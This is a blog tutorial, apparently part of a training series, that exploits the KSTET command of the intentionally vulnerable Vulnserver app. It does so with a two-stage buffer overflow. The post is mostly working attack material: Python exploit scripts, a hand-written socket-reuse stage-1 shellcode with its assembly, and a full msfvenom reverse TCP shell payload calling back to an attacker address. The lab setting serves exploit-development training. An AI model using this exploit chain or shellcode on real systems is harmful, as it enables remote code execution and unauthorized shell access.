---
slug: vulnserver-kstet/
title: 'KSTET: Multistage Exploiting'
date: 2020-06-17
category: attacks
subtitle: Exploiting in stages
tags: osce, vulnserver, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/cover_raeprd.webp
alt: Photo by Ganapathy Kumar on Unsplash
description: This post will show how to exploit the Vulnserver KSTET command
  using a socket reuse method.
keywords: Business, Information, Security, Protection, Hacking, Exploit, OSCE,
  Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCP, CHFI
about2: '"We don''t need the key, we''ll break in" RATM'
source: https://unsplash.com/photos/fjT3Zn2IhIk
---

This is the fifth article on the series of exploiting `Vulnserver`, a
VbD (Vulnerable-by-Design) application in which you can practice Windows
exploit development.

In previous posts, we have been able to exploit Vulnserver commands:

1. `TRUN` was [exploited](../vulnserver-trun/) using a direct EIP
    overwrite, with virtually no space or character restrictions to work
    on.

2. `GMON` used a [Structured Exception Handling
    (SEH)](../vulnserver-gmon/) overwrite to take control of the
    execution flow.

3. `GTER` showed up with space restrictions, and we were able to
    exploit it using [egghunters](../vulnserver-gter/) and [WinSocket
    stack reuse](../vulnserver-gter-no-egghunter/).

In this post, we will exploit the `KSTET` command where, as we will see
later, we will face a more restrictive space buffer to work with, but we
will use a different way to exploit it.

Let’s start from scratch.

## Fingerprinting KSTET

Enumerating and fingerprinting is the most important step when verifying
the security of any target.

Let’s check how the `KSTET` command behaves:

``` console
$ telnet 192.168.0.20 9999
Trying 192.168.0.20...
Connected to 192.168.0.20.
Escape character is '^]'.
Welcome to Vulnerable Server! Enter HELP for help.
KSTET hello
KSTET SUCCESSFUL
```

Well, easy enough. Now we are going to do the same, but we will check it
under our debugger. I will use Immunity Debugger.

The first step is to identify where the `KSTET` command is processed.

We can do that by right-clicking, then `Search for → All referenced text
strings`, right-click again, then `Search for text` and type `KSTET`.
Make sure that `Entire scope` is selected. Now, select the match on
where `KSTET` string is presented and set a breakpoint:

<div class="imgblock">

![Debugging
KSTET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331151/blog/vulnserver-kstet/debug1_o2nwuk.gif)

</div>

With that in place, we can start our connection to `Vulnserver` again
and see what happens under the hood:

<div class="imgblock">

![Debugging
KSTET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331151/blog/vulnserver-kstet/debug2_rkjgsp.gif)

</div>

As you can see, several things are happening:

1. Our breakpoint was reached when we typed `KSTET hello`.

2. Several external functions are called, including `strncpy`, `malloc`
    and `memset`.

3. There is one function that stands out: `strcpy`, which will copy
    anything that is on one buffer to another, without checking buffer
    boundaries.

Let’s see what happens when we issue something larger than a `hello` to
the `KSTET` command:

<div class="imgblock">

![Crash](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/crash1_efnjdw.gif)

</div>

Uggh\! With a very short string, Vulnserver crashed, and we overwrote
`EIP`, which means that we can control the execution flow of the
application.

With that, we can start creating our proof-of-concept exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 200
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![Crash](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331150/blog/vulnserver-kstet/poc1_dmu3cf.gif)

</div>

That’s good news. However, the injected string was really short, and
maybe we’d have a narrow buffer space to work on.

## Checking available buffer space

If we check the state of the application after the crash, we will see
this:

<div class="imgblock">

![Buffer
space](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/space1_qshzcz.webp)

</div>

In the dump window (bottom left), we see our injected buffer. In the
PoC, we sent 200 `A` chars, but as you can see here, the total amount of
injected bytes, including the word `KSTET` itself, is only 0x63 or 99
bytes.

In the `GTER` command exploitation, we had 140+ bytes to work on, and we
used two techniques: [WinSocket stack
reusing](../vulnserver-gter-no-egghunter/) and an
[egghunter](../vulnserver-gter/).

The first one is not viable because, although we reduced the shellcode
length to the half, the resultant shellcode was 128 bytes.

We could use an `egghunter` here, but that wouldn’t be much fun. Why
make it easy if we can do it the hard way?

Ok, let’s start by checking the offset of the crash by creating a cyclic
pattern of 100 characters using `pattern_create.rb` tool from
Metasploit:

``` console
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

And update our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'<paste pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![Cyclic
pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331150/blog/vulnserver-kstet/offset1_gfntrn.gif)

</div>

As you can see, `EIP` was overwritten with `63413363`. We can check the
offset of that bytes on our cyclic pattern to get the offset on where
`EIP` gets overwritten:

``` console
$ msf-pattern_offset -q 63413363
[*] Exact match at offset 70
```

Now, check that offset by updating our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    b'B' * 4 +
    b'C' * 26
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And run it:

<div class="imgblock">

![Cyclic
pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331148/blog/vulnserver-kstet/offset2_bhloqq.gif)

</div>

Wonderful\! We know exactly how to overwrite `EIP` to get control over
the execution flow.

## Exploiting

As with the [TRUN](../vulnserver-trun/) and [GTER](../vulnserver-gter/)
commands, we have a direct `EIP` overwrite here, and the `ESP` register
points directly to our controlled buffer. That means that we can look
for a `JMP ESP` instruction and overwrite `EIP` with its address to take
control of the execution flow. We can do that using `mona.py` plugin:

``` console
!mona jmp -r esp -cp nonull -o
```

This would tell `mona` to look for instructions that can be used to jump
to `ESP` (`jmp -r esp`), excluding pointers with null bytes (`-cp
nonull`) and omitting OS DLLs (`-o`). The result is the following:

<div class="imgblock">

![JMP
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331150/blog/vulnserver-kstet/mona1_jfvocq.webp)

</div>

We can choose any of those 9 pointers. I’ll choose the one at
`625011BB`.

Now, we can update the exploit with that address:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    b'C' * 26
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![JMP
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331150/blog/vulnserver-kstet/jmp1_izwtmw.gif)

</div>

Great\! However, as you can see, we landed on a 20 bytes buffer where we
put the `C` chars, but we have 66 bytes above on the buffer of the `A`
chars.

With a short jump backward, we can easily jump to that place:

<div class="imgblock">

![JMP
backwards](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331148/blog/vulnserver-kstet/jmp2_qzbcsx.gif)

</div>

The resultant bytes were `EB B5`. We can update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    # JMP SHORT 0xb5
    b'\xeb\xb5' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![JMP
backwards](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331149/blog/vulnserver-kstet/jmp3_pbycxb.gif)

</div>

But again, we were brutally reminded that we have a narrow buffer space
to work on.

To work around that constraint, we will use a 2-stage exploit this time,
where the first stage will be a very short shellcode that opens the door
to the second stage, which will contain our reverse shellcode.

## Stage 1: Reusing sockets

As we saw on the `GTER` [exploitation
post](../vulnserver-gter-no-egghunter/), we were able to reuse part of
the `WinSocket` calling stack to minimize our shellcode’s final lenght.
At that time, the resultant shellcode was 128 bytes. We need to reuse
something more in order to fit our stage-1 shellcode in less than 70
bytes of buffer.

Let’s check a simplified structure of a TCP server and client
interaction:

<div class="imgblock">

![TCP Server](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/socket1_j0cx68.webp)

<div class="title">

Figure 1. taken from <https://www.geeksforgeeks.org/socket-programming-cc/>

</div>

</div>

We can see the different functions needed by both the server and the
client to perform a TCP communication.

And you can notice that the actual data exchange occurs at the end by
sending and receiving information.

What we will do for our stage-1 shellcode is take advantage of that
calling stack, and create a shellcode with only a new `recv()` call
instance, reuse the socket handle that uses Vulnserver to bind to port
`9999` and set it up to receive and execute our stage-2 payload that
will contain the reverse shellcode.

But first, we need to know the structure of the `recv()` call:

**Taken from
<https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv>.**

``` cpp
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

Easy\! The parameters are really simple:

1. `SOCKET s` is the socket handle.

2. `char *buf` is a pointer on where the received data will be stored.

3. `int len` is the total amount of data expected.

4. `int flags` modifies the behavior of the `recv()` call. In our case,
    it can be zero.

But first, we need to know 2 things:

1. The address of the `recv()` call in the system.

2. The value of the socket handle.

To do that, we can use the debugger again, by right-clicking on the
`CPU` window, selecting `Search for → All intermodular calls`, looking
for the call to `WS2_32.recv` and setting a breakpoint on it:

<div class="imgblock">

![recv() call
location](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331153/blog/vulnserver-kstet/recv1_dfbgnj.gif)

</div>

Now create a new connection:

<div class="imgblock">

![recv()
call](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/recv2_jdwr9q.gif)

</div>

Wonderful\! We can see the parameters of the `recv()` call on the stack
window (bottom right) from where we can get the value of the socket
handle (`144`). We also got the address of the `recv()` function at
`0040252C`.

With all the needed values, it’s time to write some Assembler\! Remember
that we need to avoid null bytes, and we have to push the parameters in
reverse order:

``` x86asm
sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                        ; overwriting our shellcode
xor ebx,ebx             ; Zero out EBX
push ebx                ; Push 'flags' parameter = 0
add bh,0x4              ; Make EBX = 00000400 = 1024 bytes
push ebx                ; Push `len` parameter = 1024 bytes
mov ebx,esp             ; Move the current pointer of ESP into EBX
add ebx,0x64            ; Point EBX the original ESP to make it the pointer on
                        ; where our stage-2 payload will be received
push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
xor ebx,ebx             ; Zero out EBX again
add ebx,0x144           ; Make EBX = 144 that is the value of socket handle
push ebx                ; Push `s` parameter = 144
mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
                        ; null bytes. So 40252C90 is shift-left padded with 90
shr eax,0x8             ; Remove the '90' byte of EAX by shifting right.
                        ; This makes EAX = 0040252C
call eax                ; Call recv()
```

That looks good, but in fact, that code has a problem: the value of the
socket handle is created dynamically at runtime. However, the socket
handle is nothing but an integer.

Having noted that, we can update our shellcode to brute force the value
of the socket, starting from `0` until it finds the right one\!:

**shellcode.asm.**

``` x86asm
sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                        ; overwriting our shellcode
xor edi,edi             ; Zero out EDI
socket_loop:            ; Our bruteforce loop starts here
xor ebx,ebx             ; Zero out EBX
push ebx                ; Push 'flags' parameter = 0
add bh,0x4              ; Make EBX = 00000400 = 1024 bytes
push ebx                ; Push `len` parameter = 1024 bytes
mov ebx,esp             ; Move the current pointer of ESP into EBX
add ebx,0x64            ; Point EBX the original ESP to make it the pointer on
                        ; where our stage-2 payload will be received
push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
inc edi                 ; Make EDI = EDI + 1
push edi                ; Push socket handle `s` parameter = EDI = EDI + 1
mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
                        ; null bytes. So 40252C90 is shift-left padded with 90
shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                        ; This makes EAX = 0040252C
call eax                ; Call recv()
test eax,eax            ; Check if our recv() call was successfully made
jnz socket_loop         ; If recv() failed, jump back to the socket loop where
                        ; EDI will be increased to check the next socket handle
```

That looks better. We can compile that using `nasm`:

``` console
nasm -f elf32 -o shellcode.o shellcode.asm
```

And obtain the shellcode using this:

``` bash
$ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x64\x53\x47
\x57\xb8\x90\x2c\x25\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3
```

Great\! Our final stage-1 shellcode is only 34 bytes long\!

Let’s update our exploit to inject it:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

STAGE1 = (
    b'\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53' +
    b'\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\x90\x2c\x25' +
    b'\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3'
)

PAYLOAD = (
    b'KSTET ' +
    # NOP Padding
    b'\x90' * 8 +
    STAGE1 +
    b'A' * (70 - 8 - len(STAGE1)) +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    # JMP SHORT 0xb5
    b'\xeb\xb5' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending stage-1 payload...')
    fd.sendall(PAYLOAD)
    # This will trigger our stage-1 payload
    fd.recv(1024)
    print('Done.')
```

And check it:

<div class="imgblock">

![Stage-1
payload](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331152/blog/vulnserver-kstet/stage1payload_w7hmoo.gif)

</div>

Wonderful\! Our brute forcer was able to discover the socket handle
value on `EDI=0x144` and it’s ready to receive our stage-2 payload\!

## Stage 2: Injecting a reverse shellcode

Now all that’s left is to create a reverse shellcode and send it over
our stage-1 payload backdoor. As a bonus, as we control the `recv()`
call, we are not limited by bad chars on the shellcode.

Let’s create it:

``` console
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=none -f python -v SHELL
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1660 bytes
SHELL =  b""
SHELL += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
SHELL += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
SHELL += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
SHELL += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
SHELL += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
SHELL += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
SHELL += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
SHELL += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
SHELL += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
SHELL += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
SHELL += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
SHELL += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
SHELL += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
SHELL += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
SHELL += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
SHELL += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
SHELL += b"\x00\x12\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
SHELL += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
SHELL += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
SHELL += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
SHELL += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
SHELL += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
SHELL += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
SHELL += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
SHELL += b"\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6"
SHELL += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
SHELL += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

And update our exploit:

``` python
import socket
import struct
import time

HOST = '192.168.0.20'
PORT = 9999

STAGE1 = (
    b'\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53' +
    b'\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\x90\x2c\x25' +
    b'\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3'
)

SHELL =  b""
SHELL += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
SHELL += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
SHELL += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
SHELL += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
SHELL += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
SHELL += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
SHELL += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
SHELL += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
SHELL += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
SHELL += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
SHELL += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
SHELL += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
SHELL += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
SHELL += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
SHELL += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
SHELL += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
SHELL += b"\x00\x12\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
SHELL += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
SHELL += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
SHELL += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
SHELL += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
SHELL += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
SHELL += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
SHELL += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
SHELL += b"\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6"
SHELL += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
SHELL += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# Create STAGE2 with the shellcode and pad the rest of the
# 1024 buffer with NOPs
STAGE2 = SHELL + b'\x90' * (1024 - len(SHELL))

PAYLOAD = (
    b'KSTET ' +
    # NOP Padding
    b'\x90' * 8 +
    STAGE1 +
    b'A' * (70 - 8 - len(STAGE1)) +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    # JMP SHORT 0xb5
    b'\xeb\xb5' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending stage-1 payload...')
    fd.sendall(PAYLOAD)
    # This will trigger our stage-1 payload
    fd.recv(1024)
    time.sleep(3)
    print('Sending stage-2 payload...')
    fd.sendall(STAGE2)
    print('Boom!')
```

Several things are worth to mention:

1. We created a `STAGE2` variable with the shellcode and padded the
    rest of the 1024 bytes with NOPs (`\x90`).

2. We added a `time.sleep(3)` to wait for the brute force to get the
    socket handle.

3. And finally, we send the stage-2 payload.

Let’s see it in action:

<div class="imgblock">

![Stage-2
payload](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331154/blog/vulnserver-kstet/stage2payload_wyl7oa.gif)

</div>

Beautiful\! As you can see, the shellcode was injected below our
execution flow, so it will eventually be reached and triggered. Also,
the socket handle was now `0x151`, which means that our brute forcer
worked just as expected. Let’s see if we got the shell:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331149/blog/vulnserver-kstet/success_uidgpb.gif)

</div>

Woohooo\! We got our shell\! And in a lot more fun way than with
egghunters, huh?

You can download the final exploit [here](exploit.py).

## Conclusion

Multistage exploitation is a very cool method to use the available bytes
to create exploits. Tools like Metasploit use staging to deliver complex
payloads like `Meterpreter`, but when you do it yourself is a lot more
rewarding\!
